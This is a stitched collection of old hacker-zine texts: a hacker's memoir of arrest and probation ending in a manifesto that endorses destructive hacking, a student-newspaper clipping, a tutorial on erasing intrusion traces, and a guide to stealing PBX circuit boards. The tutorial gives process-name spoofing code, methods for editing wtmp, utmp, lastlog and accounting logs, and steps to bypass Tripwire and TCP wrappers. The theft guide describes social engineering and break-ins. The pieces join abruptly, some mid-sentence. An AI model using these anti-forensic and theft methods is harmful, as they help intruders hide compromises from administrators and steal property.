Nevertheless, this was all a formality, and weeks distant.  There
was time to prepare for these proceedings.  The hounds of spring
were on winter's traces.  Dale and I hoped to return to what was
left of our lives, and to enjoy the summer.

This hope was not to be fulfilled.

For, while entering the Electronic Music Lab one fine spring night,
Andy Ericson [*], a locally-renowned musician, was halted by the
University Police outside the window, as he prepared to enter.
We quickly explained that we were authorized to be present, and
immediately presented appropriate keys, IDs and other evidence that
we were authorized to be in the Lab.

Nevertheless, more quickly than could be imagined, the cops grabbed
Andy and slammed him against a cruiser, frisking him for
weapons.  They claimed that a person had been sighted carrying a
firearm on campus, and that they were investigating a call.

No weapons were discovered.  However, a small amount of marijuana
and a tiny pipe were found on him.  Interestingly, the police log
in the paper the following day noted the paraphernalia bust, but
there was no mention of any person carrying a firearm on campus.

Andy, a mathematician pursuing a Master's Degree, was performing
research in a building classified Secret, and thus required a security
clearance to enter the area where he performed his research.

His supervisor immediately yanked his security clearance, and
this greatly jeopardized his chances of completing his thesis.

This is, as with my suspicions of wiretapping, an incident in which
circumstantial evidence seems to justify my belief that the
police were, even then, continuing surveillance on my friends and
on me.  However, as with my wiretapping suspicions, there is
a maddening lack of substantial evidence to confirm my belief
beyond a reasonable doubt.

Still, the police continued their series of visits to the Lab, under
one ruse or another.  Jeffery Jones, one night, threatened to arrest
Dale for being in the Electronic Music Lab, though he had been informed
repeatedly that Dale's access was authorized by the School of Music.  Dale
turned over his keys to Police Services the following day, resenting it
bitterly.

This, however, was not to be a victory for the cops, but a crushing
embarrassment.  While their previous actions had remained at least
within the letter of the law and of university policy, this was
egregious and obvious harassment, and was very quickly quashed.

Bob Wilkins, the supervisor of the Electronic Music Lab; Burt Fenner,
head of the Electronic Music division; and the Dean of the College of
Arts and Architecture immediately drafted letters to the University
Police objecting to this illegal action; as it is the professors and
heads of departments who authorize keys, and not the University
Police.  The keys were returned within three days.

However, Jeffery was to vent his impotent rage in repeated visits to
the Lab at late hours.  On a subsequent occasion, he again threatened
to arrest Dale, without providing any reason or justification for it.

The police, Jeffery and others, always had some pretext for these visits,
but the fact that these visits only occurred when Dale was
present in the Lab, and that they visited no one else, seems to be
solid circumstantial evidence that they were more than routine
checkups.

Once the authorities become interested in you, the file is never
closed.  Perhaps it will sit in a computer for ten or twenty years.
Perhaps it will never be accessed again.  However, perhaps some
day in the distant future the police will be investigating some
unrelated incident, and will once again note your name.  You were
in the wrong building, or talked to the wrong person.  Suddenly,
their long-dormant interest in you has reawakened.  Suddenly, they
once again want you for questioning.  Suddenly, once again, they
pull your life out from under you.

This is the way democracies die, not by revolution or coups d'etat,
not by the flowing of blood in the streets like water, as historical
novelists so quaintly write.  Democracies die by innumerable papercuts.
Democracies die by the petty actions of petty bureaucrats who, like
mosquitoes, each drain their little drop of life's blood until none
is left.


XVI.  Lightning Always Strikes the Same Place Twice

One day, Dale received in the mail a subpoena, which informed him that
his testimony was required in the upcoming trial of Ron Gere, who
had moved to Florida.  The cops had charged him with criminal
conspiracy in the creation of the Huang account at the Engineering

Now, not only was I guilty of being used as a weapon against a
friend, but also guilty of this further complication, that the
police were to use a friend of mine as a weapon against yet
another friend.

It is interesting to note the manner in which the police use
betrayal, deceit and infamous methods to prosecute crime.

It is especially interesting to note the increased use of
such methods in the prosecution of crimes with no apparent victim.
Indeed, in this specific case, the only victim with a demonstrable
loss testified against the police and for the accused.

Dale resolved to plead the Fifth to any question regarding Ron,
and to risk contempt of court by doing so, rather than be used
in this manner.

This was not necessary.  As it happened, Ron was to drive well over
two thousand miles simply to sign a paper and receive ARD.  The three
of us commiserated, and then Ron was on his way back to Florida.


XVII.  Sentencing

Dale and I reported to the appropriate courtroom for sentencing.  In
the hall, a young man, shackled and restrained by two police officers,
was yelling:  "I'm eighteen, and I'm having a very bad day!"  The cops
didn't bat an eye as they dragged him to the adjoining prison.

We sat.

The presiding judge, the Hon. David C. Grine, surveyed with evident
disdain a room full of criminals like us.  Deborah Lux was there, once
again serving as counsel.  David Crowley was mercifully absent.

The judge briefly examined each case before him.  For each case, he announced
the amount of the fine, the time of probation, and banged his gavel.
Immediately before he arrived at our case, he looked at a man directly to
our left.  Instead of delivering the usual ARD sentence, he flashed a
sadistic grin and said:  "Two years jail."  Dealing marijuana was the crime.
The man's attorney objected.  The judge said:  "Okay, two years, one
suspended."  The attorney, another flunky from the public defender's
office, sat down again.  Two cops immediately dragged the man from the
courtroom to take him to jail.

I noted that practically everyone in the room was poor,
and those with whom I spoke were all uneducated.  DUI was the
most common offense.

Judge Grine came to our case, announced the expected sentence,
and we reported upstairs to be assigned probation officers.  I was
disgusted with myself for having agreed to this arrangement, and
perhaps this was why I was surly with the probation officer, Thomas
Harmon.  This earned me a visit to a court-appointed psychiatrist,
to determine if I were mentally disturbed or on drugs.

That I was neither was satisfied by a single interview, and no
drug-testing was necessary; for which I am grateful, for I would
have refused any such testing.  Exercising this Fifth Amendment-
guaranteed right is, of course, in this day considered to be
an admission of guilt.  The slow destruction of this right began
with the government policy of "implied consent," by which one
signs over one's Fifth Amendment rights against self-incrimination
by having a driver's license, allowing a police officer to pull
you over and test your breath for any reason or for no reason
at all.

I later apologized to Thomas Harmon for my rudeness, as he had
done me no disservice; indeed, a probation officer is, at least,
in the business of keeping people out of jail instead of putting
them there; and his behavior was less objectionable than that of
any other police officer involved in my case.

Very shortly thereafter, realizing that I knew a large number
of the local police on a first-name basis, I left the area, with the
stated destination of Indiana.  I spent the next two years travelling,
with such waypoints as New Orleans, Denver, Seattle and Casper, Wyoming;
and did not touch a computer for three years, almost having a horror
of them.

I did not pay my fine in the monthly installments the court demanded.
I ignored virtually every provision of my probation.  I did not remain
in touch with my probation officer, almost determined that my absence
should be noticed.  I did a lot of drugs, determined to obliterate all
memory of my previous life.  In Seattle, heroin was a drug of choice,
so I did that for a while.

Finally, I arrived at my stated destination, Indiana, with only about
three months remaining in my probation, and none of my fines paid.  Dale,
without my knowledge, called my parents and convinced them to pay the
fine.

It took me a few days of thought to decide whether or not to accept
their generous offer; I had not thought of asking them to pay the fine,
sure that they would not.  Perhaps I had done them a disservice in so
assuming, but now I had to decide whether to accept their help.

If my fines were not paid, my ARD would be revoked, and a new trial
date would be set.  I was half determined to return and fight this
case, still ashamed of having agreed to such a deal under duress.
However, after discussing it at exhaustive length with everyone I
knew, I came to the conclusion that to do so would be foolish and quixotic.
Hell, I thought, Thoreau did the same thing in a similar circumstance;
why shouldn't I?

I accepted my parents' offer.  Three months later, I received a letter in
the mail announcing that the case had been dismissed and my records
expunged, with an annotation to the effect that records would be
retained only to determine eligibility for any future ARD.  I believe
this to the same degree in which I believe that the NSA never
performs surveillance on civilians.  I have my doubts that the FBI
eliminated all mention of me from their files.  I shall decide after
I file a Freedom of Information Act request and receive a reply.

I now have a legitimate Internet account and due to my experiences
with weak encryption am a committed cypherpunk and Clipper Chip
proposal opponent.

What is the moral to this story?

Even now, when I have had several years to gain distance and perspective,
there does not seem to be a clear moral; only several pragmatic
lessons.

I became enamored of my own brilliance, and arrogantly sure that
my intelligence was invulnerability.  I assumed my own immortality,
and took a fall.  This was not due to the intelligence of my
adversaries, for the stupidity of the police was marvellous to
behold.  It was due to my own belief that I was somehow infallible.

Good intentions are only as good as the precautions taken to ensure
their effectiveness.

There is always a Public Enemy Number One.  As the public's fickle
attention strays from the perceived menace of drug use, it will latch
on to whatever new demon first appears on television.  With the
growing prevalence of hatchet jobs on hackers in the public media,
it appears that hackers are to be the new witches.

It is advisable, then, that we avoid behavior which would tend to
confirm the stereotypes.  For every Emmanuel Goldstein or R. U.
Sirius in the public eye, there are a dozen Mitnicks and Hesses;
and, alas, it is the Mitnicks and Hesses who gain the most attention.
Those who work for the betterment of society are much less interesting
to the media than malicious vandals or spies.

In addition, it is best to avoid even the appearance of dishonesty
in hacking, eschewing all personal gain.

Phreaking or hacking for personal gain at the expense of others is
entirely unacceptable.  Possibly bankrupting a small company through
excessive telephone fraud is not only morally repugnant, but also puts
money into the coffers of the monopolistic phone companies that we despise.

The goal of hacking is, and always has been, the desire for full
disclosure of that information which is unethically and illegally
hidden by governments and corporations; add to that a dash of
healthy curiosity and a hint of rage, and you have a solvent capable
of dissolving the thickest veils of secrecy.  If destructive means
are necessary, by all means use them; but be sure that you are not
acting from hatred, but from love.

The desire to destroy is understandable, and I sympathize with it;
anyone who can not think of a dozen government bodies which would be
significantly improved by their destruction is probably too
dumb to hack in the first place.  However, if that destruction merely
leads to disproportionate government reprisals, then it is not only
inappropriate but counterproductive.

The secrecy and hoarding of information so common in the hacker
community mirrors, in many respects, the secrecy and hoarding of
information by the very government we resist.  The desired result
is full disclosure.  Thus, the immediate, anonymous broadband
distribution of material substantiating government and corporate
wrongdoing is a mandate.

Instead of merely collecting information and distributing it
privately for personal amusement, it must be sent to newspapers,
television, electronic media, and any other means of communication
to ensure both that this information can not be immediately
suppressed by the confiscation of a few bulletin board systems
and that our true motives may be discerned from our public and
visible actions.

Our actions are not, in the wake of Operation Sun-Devil and the
Clipper Chip proposal, entirely free.  The government has declared
war on numerous subsections of its own population, and thus has
defined the terms of the conflict.  The War on Drugs is a notable
example, and we must ask what sort of a government declares war
on its own citizens, and act accordingly.

Those of us who stand for liberty must act while we still can.

It is later than we think.

Unlawful computer use leads to arrests
ALEX H. LIEBER, Collegian Staff Writer

Two men face charges of unlawful computer use, theft of services in a
preliminary hearing scheduled for this morning at the Centre County Court of
Common Pleas in Bellefonte.  Dale Garrison, 111 S. Smith St., and Robert W.
Clark, 201 Twin Lake Drive, Gettysburg, were arrested Friday in connection with
illegal use of the University computer system, according to court records.
Garrison, 36, is charged with the theft of service, unlawful computer use
and criminal conspiracy.  Clark, 20, is charged with multiple counts of
unlawful computer use and theft of service.  [...]

Clark, who faces the more serious felony charges, allegedly used two computer
accounts without authorization from the Center of Academic Computing or the
Computer Science Department and, while creating two files, erased a file from
the system.  [...]  When interviewed by University Police Services, Clark
stated in the police report that the file deleted contained lists of various
groups under the name of "ETZGREEK."  Clark said the erasure was accidental,
resulting from an override in the file when he tried to copy it over onto a
blank file.  According to records, Clark is accused of running up more than
$1000 in his use of the computer account.  Garrison is accused of running up
more than $800 of computer time.

Police began to investigate allegations of illegal computer use in November
when Joe Lambert, head of the university's computer department, told police a
group of people was accessing University computer accounts and then using those
accounts to gain access to other computer systems.  Among the systems accessed
was Internet, a series of computers hooked to computer systems in industry,
education and the military, according to records.

The alleged illegal use of the accounts was originally investigated by a
Computer Emergency Response Team at Carnegie-Mellon University, which assists
other worldwide computer systems in investigating improper computer use.

Matt Crawford, technical contact in the University of Chicago computer
department discovered someone had been using a computer account from Penn State
to access the University of Chicago computer system.

  Hmm.  Sucks don't it? Breaking into a system but only to have your access
cut off the next day.  Right before you had the chance to download that 2
megabyte source code file you have been dying to get all year.

  Why was the access cut?  Damn, you forgot to nuke that .rhosts file that
you left in the root directory.  Or maybe it was the wtmp entries you didn't
bother to edit.  Or perhaps the tcp_wrapper logs that you didn't bother to
look for.  Whatever it was, it just screwed your access and perhaps, just
got you busted.

----  End of incident report

  Hey, it's human nature to be careless and lazy.  But, when you're a hacker,
and you're illegally breaking into computer systems this isn't a luxury that
you can afford.  Your efforts in penetrating have to be exact, concise,
sharp, witty and skillful.  You have to know when to retreat, run, hide,
pounce or spy.  Let us put it this way, when you get your feet muddy and
walk on new carpet without cleaning it up, you're gonna get spanked.

  I can't tell you how many times I've see a hacker break into a system and
leave their muddy footprints all over the system.  Hell, a quarter of the
hosts on the Internet need to be steam-cleaned.

  This is sad.  Especially since you could have had the ability to do the
washing yourself.  Why bother cracking systems if you leave unauthorized login
messages on the console for the administrators?  Beats me.

  This article is about hiding your access--the little tricks of the trade
that keep you unnoticed and hidden from that evil bastard, the system
administrator.

  I should probably start by explaining exactly where common accounting/log
files are kept and their roles in keeping/tracking system information.

# Drinking jolt and jerking the logs

  Syslog(3),  The "Big Daddy" of logging daemons, is the master of all system
accounting and log reporting.  Most system components and applications
depend on syslogd to deliver the information (accounting, errors, etc.) to
the appropriate place.  Syslog (syslogd) reads a configuration file
(/etc/syslog.conf) on startup to determine what facilities it will support.

  Syslog ususally has the following facilities and priorities:

  Facilities: kern user mail daemon auth syslog lpr news uucp
  Priorities: emerg alert crit err warning notice info debug

  Facilities are the types of accounting that occur and priorities are the
level of urgency that the facilities will report.  Most facilities are
divided and logged into separate accounting files.  The common being daemon,
auth, syslog, and kern.

  Priorities are encoded as a facility and a level.  The facility usually
describes the part of the system generating the message. Priorities are
defined in <sys/syslog.h>.

  In order to by-pass or suspend system accounting it is necessary to
understand how it works.  With syslog, it is important to know how to
read and determine where accounting files are delivered.  This entails
understanding how syslog configures itself for operation.

# Reading and understanding /etc/syslog.conf.

  Lines in the configuration file have a selector to determine the
message priorities to which the line applies and an action.  The action
fields are separated from the selector by one or more tabs.

  Selectors are semicolon separated lists of priority specifiers.  Each
priority has a facility describing the part of the system that generated
the message, a dot, and a level indicating the severity of the message.
Symbolic names could be used.  An asterisk selects all facilities.  All
messages of the specified level or higher (greater severity) are
selected. More than one facility may be selected using commas to separate
them.  For example:

   *.emerg;mail,daemon.crit

  selects all facilities at the emerg level and the mail and daemon facil-
ities at the crit level.

  Known facilities and levels recognized by syslogd are those listed in
syslog(3) without the leading ``LOG_''. The additional facility ``mark''
has a message at priority LOG_INFO sent to it every 20 minutes (this may be
changed with the -m flag).  The ``mark'' facility is not enabled by a
facility field containing an asterisk.  The level ``none'' may be
used to disable a particular facility.  For example,

   *.debug;mail.none

   Sends all messages except mail messages to the selected file.

   The second part of each line describes where the message is to be logged
if this line is selected.  There are four forms:

   o A filename (beginning with a leading slash).  The file
 will be opened in append mode.

   o A hostname preceded by an at sign (``@'').  Selected
 messages are forwarded to the syslogd on the named host.

   o A comma separated list of users.  Selected messages are
 written to those users if they are logged in.

   o An asterisk.  Selected messages are written to all
 logged-in users.

   For example, the configuration file:

   kern,mark.debug /dev/console
   *.notice;mail.info /usr/spool/adm/syslog
   *.crit               /usr/adm/critical
   kern.err  @phantom.com
   *.emerg  *
   *.alert  erikb,netw1z
   *.alert;auth.warning ralph

   logs all kernel messages and 20 minute marks onto the system
console, all notice (or higher) level messages and all mail system messages
except debug messages into the file /usr/spool/adm/syslog, and all critical
messages into /usr/adm/critical; kernel messages of error severity or
higher are forwarded to ucbarpa.  All users will be informed of any
emergency messages, the users ``erikb'' and ``netw1z''  will be informed of
any alert messages, or any warning message (or higher) from the authorization
system.

   Syslogd creates the file /etc/syslog.pid, if possible, containing a
single line with its process id; this is used to kill or reconfigure
syslogd.

# System login records

  There are there basic areas (files) in which system login information is
stored.  These areas are:

  /usr/etc/wtmp
  /usr/etc/lastlog
  /etc/utmp

  The utmp file records information about who is currently using the
system.  The file is a sequence of entries with the following structure
declared in the include file (/usr/include/utmp.h):

            struct utmp {
                  char    ut_line[8];             /* tty name */
                  char    ut_name[8];             /* user id */
                  char    ut_host[16];            /* host name, if remote */
                  long    ut_time;                /* time on */
            };

  This structure gives the name of the special file associated
with the user's terminal, the user's login name, and the
time of the login in the form of time(3C).  This will vary from platform
to platform.  Since Sun Microsystems ships SunOs with a world writable
/etc/utmp, you can easily take yourself out of any who listing.

  The wtmp file records all logins and logouts.  A null username
indicates a logout on the associated terminal.  Furthermore, the terminal
name `~' indicates that the system was rebooted at the indicated time;
the adjacent pair of entries with terminal names `|' and `{' indicate the
system maintained time just before and just after a date command has
changed the system's idea of the time.

  Wtmp is maintained by login(1) and init(8).  Neither of these programs
creates the file, so if it is removed or renamed record-keeping is turned off.
Wtmp is used in conjunction with the /usr/ucb/last command.

  /usr/adm/lastlog is used by login(1) for storing previous login dates, times,
and connection locations.  The structure for lastlog is as follows:

            struct lastlog {
                  time_t  ll_time;
                  char    ll_line[8];
                  char    ll_host[16];
            };

  The structure for lastlog is quite simple.  One entry per UID, and it is
stored in UID order.

  Creating a lastlog and wtmp editor is quite simple.  Example programs are
appended at the end of this file.

# System process accounting

  Usually, the more security-conscience systems will have process accounting
turned on which allows the system to log every process that is spawned.
/usr/adm/acct or /usr/adm/pacct are the usual logfiles that store the
accounting data.  These files can grow quite large as you can imagine, and
are sometimes shrunk by other system applications and saved in a compressed
format as /usr/adm/savacct or something similar.

  Usually, if the accounting file is there with a 0 byte length then you can
rest assured that they are not keeping process accounting records.  If they
are however, there are really only two methods of hiding yourself from this
form of accounting.  One, you can suspend or stop process accounting (
which is usually done with the "accton" command) or you can edit the existing
process logfile and "wipe" your incriminating records.

  Here is the common structure for the process accounting file:

  struct  acct
  {
        char    ac_comm[10];            /* Accounting command name */
        comp_t  ac_utime;               /* Accounting user time */
        comp_t  ac_stime;               /* Accounting system time */
        comp_t  ac_etime;               /* Accounting elapsed time */
        time_t  ac_btime;               /* Beginning time */
        uid_t   ac_uid;                 /* Accounting user ID */
        gid_t   ac_gid;                 /* Accounting group ID */
        short   ac_mem;                 /* average memory usage */
        comp_t  ac_io;                  /* number of disk IO blocks */
        dev_t   ac_tty;                 /* control typewriter */
        char    ac_flag;                /* Accounting flag */
   };

  It is extremely tricky to remove all of your account records since if you
do use a program to remove them, the program that you run to wipe the
records will still have a process that will be appended to the logfile
after it has completed.

  An example program for removing process accounting records is included
at the end of this article.

  Most sysadmins don't pay real attention to the process logs, since they
do tend to be rather large and grow fast.  However, if they notice that a
break-in has occurred, this is one of the primary places they will look for
further evidence.

  On the other hand, for normal system monitoring, you should be more worried
about your "active" processes that might show up in a process table listing
(such as ps or top).

  Most platforms allow the general changing of the process name without having
any kind of privileges to do so.  This is done with a simple program as noted
below:

  #include <stdio.h>
  #include <string.h>

  int main(argc, argv)
      int argc;
      char **argv;
  {
    char *p;

    for (p = argv[0]; *p; p++)
        *p = 0;

    strcpy(argv[0], "rn");

    (void) getchar ();  /* to allow you to see that ps reports "rn" */
    return(0);
  }

  Basically, this program waits for a key-stroke and then exits.  But,
while it's waiting, if you were to lookup the process it would show the name
as being "rn".  You're just actually re-writing the argument list of the
spawned process.  This is a good method of hiding your process or program
names ("crack", "hackit", "icmpnuker").  Its a good idea to use this method
in any "rogue" programs you might not want to be discovered by a system
administrator.

  If you cant corrupt your process arguments, rename your program to something
that at least looks normal on the system.  But, if you do this, make sure that
you don't run the command as "./sh" or "./ping" .. Even this looks suspicious.
Put your current path in front of your PATH environment variable and avoid
this mistake.

# Tripping the wire

 That little piss-ant up at Purdue thinks he has invented a masterpiece..
I'll let his words explain what "Tripwire" is all about.  Then, i'll go over
some brief flaws in tripwire and how to circumvent it.

---- Tripwire README Introduction

  1.0.  Background
  ================

     With the advent of increasingly sophisticated and subtle
 account break-ins on Unix systems, the need for tools to aid in
 the detection of unauthorized modification of files becomes
 clear.  Tripwire is a tool that aids system administrators and
 users in monitoring a designated set of files for any changes.
 Used with system files on a regular (e.g., daily) basis, Tripwire
 can notify system administrators of corrupted or tampered files,
 so damage control measures can be taken in a timely manner.

  1.1.  Goals of Tripwire
  =======================


     Tripwire is a file integrity checker, a utility that compares
 a designated set of files against information stored in a
 previously generated database.  Any differences are flagged and
 logged, and optionally, a user is notified through mail.  When
 run against system files on a regular basis, any changes in
 critical system files will be spotted -- and appropriate damage
 control measures can be taken immediately.  With Tripwire, system
 administrators can conclude with a high degree of certainty that
 a given set of files remain free of unauthorized
 modifications if Tripwire reports no changes.

---- End of Tripwire excerpt

  Ok, so you know what tripwire does.  Yup, it creates signatures for all
files listed in a tripwire configuration file.  So, if you were to change
a file that is "tripwired", the proper authorities would be notified and your
changes could be recognized.  Gee.  That sounds great.  But there are a
couple of problems with this.

  First, tripwire wasn't made to run continuously (i.e., a change to a system
binary might not be noticed for several hours, perhaps days.)  This allows
somewhat of a "false" security for those admins who install tripwire.

  The first step in beating tripwire is to know if the system you are on
is running it.  This is trivial at best.  The default location where
tripwire installs its databases are /usr/adm/tcheck or /usr/local/adm/tcheck.

  The "tcheck" directory is basically made up of the following files:

  -rw-------  1 root         4867 tw.config
  drwxr-----  2 root          512 databases

  The file "tw.config" is the tripwire configuration file.  Basically, it's a
list if files that tripwire will create signatures for.  This file usually
consists of all system binaries, devices, and configuration files.

  The directory "databases" contains the actual tripwire signatures for
every system that is configured in tw.config.  The format for the database
filenames are tw.db_HOSTNAME.  An example signature entry might look like:

/bin/login 27 ../z/. 100755 901 1 0 0 50412 .g53Lz .g4nrh .g4nrt 0 1vOeWR/aADgc0
oQB7C1cCTMd 1T2ie4.KHLgS0xG2B81TVUfQ 0 0 0 0 0 0 0

   Nothing to get excited about.  Basically it is a signature encrypted in one
of the many forms supplied by tripwire.  Hard to forge, but easy to bypass.

   Tripwire takes a long time to check each file or directory listed in
the configuration file.  Therefore, it is possible to patch or change a system
file before tripwire runs a signature check on it.  How does one do this?
Well, let me explain some more.

   In the design of tripwire, the databases are supposed to be kept either on
a secure server or a read-only filesystem.  Usually, if you would want to
patch a system binary 9 times out of 10 you're going to want to have root
access.  Having root access to by-pass tripwire is a must.  Therefore, if you
can obtain this access then it is perfectly logical that you should be able to
remount a filesystem as Read/Write.  Once accomplished, after installing your
patched binary, all you have to do is:

   tripwire -update PATH_TO_PATCHED_BINARY

   Then, you must also:

   tripwire -update /usr/adm/tcheck/databases/tw.db_HOSTNAME
   (If they are making a signature for the tripwire database itself)

   You'll still be responsible for the changed inode times on the database.
But that's the risk you'll have to live with.  Tripewire wont detect the change
since you updated the database.  But an admin might notice the changed times.

# Wrapping up the wrappers

   Ta da.  You got the access.  uh-oh.  What if they are running a TCP
wrapper?  There are three basic ways they could be running a wrapper.

   1) They have modified /etc/inetd.conf and replaced the daemons they
      want to wrap with another program that records the incoming
      hostname and then spawns the correct daemon.

   2) They have replaced the normal daemons (usually in /usr/etc) with
      a program that records the hostname then launches the correct
      daemon.

   3) They have modified the actual wrappers themselves to record
      incoming connections.

  In order to bypass or disable them, you'll first need to know which
method they are using.

 First, view /etc/inetd.conf and check to see if you see something
similar to:

  telnet  stream  tcp     nowait  root    /usr/etc/tcpd     telnetd ttyXX

  This is a sure sign that they are running Wietse Venema's tcp_wrapper.

  If nothing is found in /etc/inetd.conf, check /usr/etc and check for any
abnormal programs such as "tcpd", "wrapd", and "watchcatd".  Finally, if
nothing is still found, try checking the actually daemons by running
"strings" on them and looking for logfiles or by using sum and comparing them
to another system of the same OS that you know is not using a wrapper.

  Okay, by now you know whether or not they have a wrapper installed.  If
so you will have to now decide what to do with the output of the wrapper.
You'll have to know where it put the information.  The most common wrapper
used is tcp_wrapper.  Here is another README excerpt detailing where the
actually output from the wraps are delivered.

---- Begin of tcp_wrapper README

  3.2 - Where the logging information goes
  ----------------------------------------

 The wrapper programs send their logging information to the syslog
 daemon (syslogd). The disposition of the wrapper logs is determined by
 the syslog configuration file (usually /etc/syslog.conf). Messages are
 written to files, to the console, or are forwarded to a @loghost.

 Older syslog implementations (still found on Ultrix systems) only
 support priority levels ranging from 9 (debug-level messages) to 0
 (alerts). All logging information of the same priority level (or more
 urgent) is written to the same destination.  In the syslog.conf file,
 priority levels are specified in numerical form.  For example,

 8/usr/spool/mqueue/syslog

 causes all messages with priority 8 (informational messages), and
 anything that is more urgent, to be appended to the file
 /usr/spool/mqueue/syslog.

 Newer syslog implementations support message classes in addition to
 priority levels.  Examples of message classes are: mail, daemon, auth
 and news. In the syslog.conf file, priority levels are specified with
 symbolic names: debug, info, notice, ..., emerg. For example,

     mail.debug   /var/log/syslog

 causes all messages of class mail with priority debug (or more urgent)
 to be appended to the /var/log/syslog file.

 By default, the wrapper logs go to the same place as the transaction
 logs of the sendmail daemon. The disposition can be changed by editing
 the Makefile and/or the syslog.conf file. Send a `kill -HUP' to the
 syslogd after changing its configuration file. Remember that syslogd,
 just like sendmail, insists on one or more TABs between the left-hand
 side and the right-hand side expressions in its configuration file.

  Usually just editing the output and hoping the sysadmin didnt catch the
the wrap will do the trick since nothing is output to the console
(hopefully).

# Example programs

  The following are short and sweet programs that give you the ability
to edit some of the more common logfiles found on most platforms.  Most
of these are pretty simple to compile, although some might need minor
porting and OS consideration changes in structures and configurations.

                  (K)opywronged 1993, by Dark Side Research

***************************************************************************

BACKGROUND
~~~~~~~~~~

July 1989, Mobil Oil Corporation Headquarters -- Fairfax, VA.

     Abundant technology, late hours, and shadows between city lights
made up the typical environment CO/der DEC/oder repeatedly found
adventure in.  On one such night in the summer of '89, a reconnaissance
outing landed him at the offices of Mobil Oil Corp.  The door leading
from the multi-level parking garage into the foyer was equipped
with an access-request phone and a square black pad.  The pad was flush
with the wall, and sported a red LED in its center -- a rather imposing
device used to read magnetic access cards.  CODEC picked up the phone
and listened to a couple rings followed by the voice of a security
guard, "Good evening, security ..."
     "Evenin', this is Dick Owens with CACI graphics.  I don't have a
card, but just call upstairs and they'll verify."
     "Hold on, sir ..."
     Kastle Security's verification call registered as a sudden 90 VAC
spike on Cablecast 0perator's meter.  Clipped on the blue and white pair
of CACI's incoming hunt group, Cable picked up on his TS-21:
     "Hello?"
     "This is Kastle Security.  We've got a Dick Owens downstairs
requesting access."
     "Yeah Sure.  Let him in please."
     The security man took Codec off hold, "Okay sir, what entrance are
you at?"
     "Garage level one."
     The door clicked, and in went the hacker-thief -- grinning.
Another lock at the end of a hallway also hindered access, but a
screwdriver, placed between door and frame, removed the obstruction with
a quickly applied force.
     CACI was a graphics outfit sharing the same building with Mobil.
After a perusal through its desks and darkened corridors turned up a
cardkey for later use, Codec -- pausing casually along the way at the
drunking fountain -- made his way to the opposite end of the hallway and
into Mobil's mail receiving room.  In contrast to elsewhere in the
building, this room was chilly -- as if heavy air conditioning was
nearby.  There was also a faint roar of fans to enhance this notion.
And behind a countertop in the direction of the noise, a split door could
be seen through which mail and parcels were passed during business
hours.  Hardly an obstacle, he was on the other side in an instant.
This "other side" was no less than a gateway to nirvana.  At first he
began taking in the sight of a mini-computer, console, and mass storage
devices, but his eyes were virtually pulled to the giant on his left.
It was the largest and most impressive PBX he had yet seen; a label
above the five gargantuan, interconnected cabinets read, "AT&T SYSTEM
85."  The hacker's heart raced -- he wanted to explore, control, and own
the switch all at once.  Within seconds his gloved hands caressed the
cabinets while his hungry eyes scanned circuit pack descriptors, mouth
agape.  Codec grabbed some manuals, jotted down numbers to a modem
stack, and reluctantly departed.  A week later, he stole the switch.
     To the Dark Side Research group, the System 85 would be worth
approximately $100,000 -- but to Mobil, the system was worth at least
six times that figure.  In its entirety it was more valuable, but DSR
was only concerned with the guts; the digital circuitry of the system.
When Codec reentered the building the following week, he was wearing a
VOX headset attached to a hand-held 2-meter band (HAM) radio.  This was
strapped to his chest except for the rubber-whip antenna which protruded
out of a hole in his jacket.  His awestruck, gleeful countenance from
a week prior had been replaced by a more grave expression, and the
moisture now on his body was no longer from unconscious salivation
but due to the sweat of anticipation and rapid movement.
     "Phase one complete," he spoke into the boom mic in front of his
face.
     "Roger Nine-Two.  Quit breathing on the VOX or adjust sensitivity,
over."
     "Roger Nine-Three.  Entering heavy EMI area," Codec acknowledged to
one of the lookouts.
     Steps were retraced through the mail room, where several empty
boxes marked "U.S. Mail" and a dolly were conveniently stored.  The
System 85 was shut down, cabinet by cabinet, as most of the circuit
boards were hastily removed and boxed.  Seven boxes were filled,
requiring two trips with the dolly to a side door.
     "All units: ready for docking."
     "Roger Nine-Two.  Standby.  Nine-Three, okay for docking?"
     "Step on it, over ..."
     A Ford Escort with its hatch open raced up to where Codec and the
boxes stood.  Within fifteen minutes the circuit packs were unloaded in
a public storage unit.  Within half an hour, CO/dec DEC/oder, Cablecast
0perator, and the remainder of the night's crew were filling up with
doughnuts of the nearby 7-11, observing local law enforcement doing the
same.

APRIL 1993: Security memorandum broadcast from wrq.com -- Internet

     "We've all heard of toll fraud as a way to steal telecommunications
resources.  Now the ante has been escalated.  I've heard of a
company on the East Coast that was having some minor troubles with their
PBX.  A technician showed up at the door and asked directions to the PBX
closet.  The company showed this person the way without checking any
credentials, and about five minutes later the phones went completely
dead.  They went up to the PBX closet and found that several boards from
the PBX had been removed and that the 'repairman' had departed."


     The theft of PBX circuit boards is a novel idea and seldom heard
of, but -- as made apparent above -- it does occur.  In the used PBX
scene, often referred to as the "secondary" or "grey" market, there is
always a demand for circuit packs from a wide variety of PBXs.  The
secondhand PBX industry grew from $285 million in 1990 to $469 million
in 1992 -- despite the recession.
     The essence of any PBX is a rack or multiple racks of circuit
cards/boards/packs, with an average grey market value of anywhere from
$50 to $2000 each.  The cards are lightweight, small in size, and can
even withstand a moderate dose of abuse.  Transport of misappropriated
circuit boards is done without risk -- under and police scrutiny, a box
of these looks like a mere pile of junk (or senior engineering project)
in the trunk of your car.  Furthermore, the serial numbers on the boards
are seldom, if ever, kept track of individually, and these can be
removed or "replaced" in any case.  Unlike computer equipment or
peripherals, PBX cards are extremely safe, simple, and non-proprietary
components to handle -- even in quantity.
     Although you may wish to physically access PBXs for reasons other
than theft, it will be assumed here that monetary gain is your motive.
In either case, this introductory file makes it clear that access can be
achieved with varying levels of ease.  A PBX theft should be thought of
in terms of two phases:  reconnaissance and extraction.  Recon involves
finding and selecting prime targets.  Extraction is the actual theft of
the system.  Both phases can be completed through "office building
hacking," a wide variety of deception, breaking and entering, social
engineering, and technical skills.

Phase I : Reconnaissance

     PBXs are found where people's communications needs warrant the
capabilities of such a system -- offices, schools, hotels, convention
centers, etc.  The PBXs we will concert ourselves with in this discourse
however are those located in shared or multiple-leased office
structures; the "typical" office buildings.  The typical office building
has enough floors to require an elevator, some parking space, a lobby,
and a company directory (Because it is shared by more than one
business).  Companies that occupy an entire building by  themselves are
generally too secure to be worthwhile targets.
     Tenant companies in the typical building lease all different size
office space -- some rent only 300 sq. ft., others take up entire
floors.  Those that use half a floor or more usually meet the criteria
for PBX ownership.  Obviously, the larger the firm's office at that
site, the greater its PBX will be, so those business spread out over
several floors will have the most valuable systems.  This is not always
